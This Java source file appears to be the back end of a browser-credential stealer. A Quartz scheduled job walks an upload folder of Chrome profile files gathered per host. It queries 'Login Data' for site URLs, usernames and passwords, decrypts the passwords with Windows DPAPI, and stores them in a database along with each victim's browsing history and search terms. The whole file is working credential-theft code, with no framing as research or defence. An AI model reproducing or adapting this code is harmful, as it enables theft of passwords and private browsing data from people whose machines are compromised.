package com.jimmy.infaction.job;

import com.jimmy.infaction.common.HistoryKeyResult;
import com.jimmy.infaction.common.HistoryUrlResult;
import com.jimmy.infaction.common.SqlLiteDemoResult;
import com.jimmy.infaction.common.SqliteHelper;
import com.jimmy.infaction.pojo.*;
import com.jimmy.infaction.service.BrowserDownloadService;
import com.jimmy.infaction.service.BrowserKeywordService;
import com.jimmy.infaction.service.BrowserService;
import com.jimmy.infaction.service.BrowserUrlService;
import com.sun.jna.platform.win32.Crypt32Util;
import org.quartz.Job;
import org.quartz.JobExecutionContext;
import org.quartz.JobExecutionException;
import org.quartz.SchedulerException;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.ApplicationContext;
import org.springframework.scheduling.quartz.SchedulerFactoryBean;
import org.springframework.stereotype.Component;
import org.springframework.stereotype.Service;


import java.io.File;
import java.util.List;

/**
 * @author jimmy on 2019/9/26 17:50
 */
public class DeBagJob  implements  Job {
	private static Logger log = LoggerFactory.getLogger(DeBagJob.class);
//	@Autowired
//	private BrowserService browserService;
	@Override
	public void execute(JobExecutionContext jobContext) throws JobExecutionException {
		ApplicationContext applicationContext=null;
		try {
			//get sping context
			applicationContext=getApplicationContext(jobContext);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		//find xml register beanservice
		BrowserService browserService = (BrowserService) applicationContext.getBean("browserService");
		BrowserDownloadService browserDownloadService = (BrowserDownloadService) applicationContext.getBean("browserDownloadService");
		BrowserKeywordService browserKeywordService = (BrowserKeywordService) applicationContext.getBean("browserKeywordService");
		BrowserUrlService browserUrlService = (BrowserUrlService) applicationContext.getBean("browserUrlService");
		String rootPath = "F:\\workspace\\infaction\\upload\\";
		File dir = new File(rootPath);
		File[] files = dir.listFiles();
		for (File f : files) {
			if (!(f.getName().matches(".*.zip"))) {
				for (File ff : f.listFiles()) {
					try {
						switch (ff.getName()){
							case "Login Data":
								SqliteHelper h = new SqliteHelper(rootPath+f.getName()+"\\"+"Login Data");
								List<SqlLiteDemoResult> demoList = h.executeQueryList("Select action_url, username_value, password_value FROM logins", SqlLiteDemoResult.class);
								for (SqlLiteDemoResult result : demoList) {
									Browser browser = new Browser();
									browser.setWebsite(result.getAction_url());
									browser.setHostid(f.getName());
									browser.setUser(result.getUsername_value());
									browser.setPassword(new String(Crypt32Util.cryptUnprotectData(result.getPassword_value())));
									browserService.insert(browser);
								}
							case "History":
								SqliteHelper hi = new SqliteHelper(rootPath+f.getName()+"\\"+"History");
								List<HistoryUrlResult> HList = hi.executeQueryList("Select url, title, visit_count FROM urls", HistoryUrlResult.class);
								for (HistoryUrlResult result : HList) {
									Browser_url browser_url = new Browser_url();
									browser_url.setWebsite(result.getWebsite());
									browser_url.setTitle(result.getTitle());
									browser_url.setVisit(result.getVisit());
									browser_url.setHostid(f.getName());
									browserUrlService.insert(browser_url);
								}
								List<HistoryKeyResult> HkList = hi.executeQueryList("Select  lower_term FROM keyword_search_terms", HistoryKeyResult.class);
								for (HistoryKeyResult result : HkList) {
									Browser_keyword browser_keyword = new Browser_keyword();
									browser_keyword.setKey(result.getKey());
									browser_keyword.setHostid(f.getName());
									browserKeywordService.insert(browser_keyword);
								}

							case "Cookies":
//								System.out.println(ff.getName());
							default:
								continue;
						}
					} catch (Exception e) {
						e.printStackTrace();
					}
//					ff.delete();
				}
			}
		}
	}
	private static final String APPLICATION_CONTEXT_KEY = "applicationContextKey";
	private ApplicationContext getApplicationContext(JobExecutionContext jobContext) throws SchedulerException {
		ApplicationContext appCtx = null;
		appCtx = (ApplicationContext) jobContext.getScheduler().getContext().get(APPLICATION_CONTEXT_KEY);
		if (appCtx == null) {
			throw new JobExecutionException("No application context available in scheduler context for key \"" + APPLICATION_CONTEXT_KEY + "\"");
		}
		return appCtx;
	}

}
